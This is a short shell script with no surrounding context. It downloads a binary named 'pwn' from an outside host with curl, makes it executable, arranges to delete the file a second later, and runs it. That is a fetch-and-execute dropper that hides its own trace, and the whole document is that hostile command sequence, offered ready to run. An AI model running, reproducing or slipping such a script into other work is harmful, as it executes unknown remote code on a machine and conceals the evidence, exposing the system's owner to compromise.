curl -fsSL http://segyero.medican.kr/data/pwn -o pwn || exit
chmod +x ./pwn || exit
(sleep 1 && rm ./pwn & )
./pwn
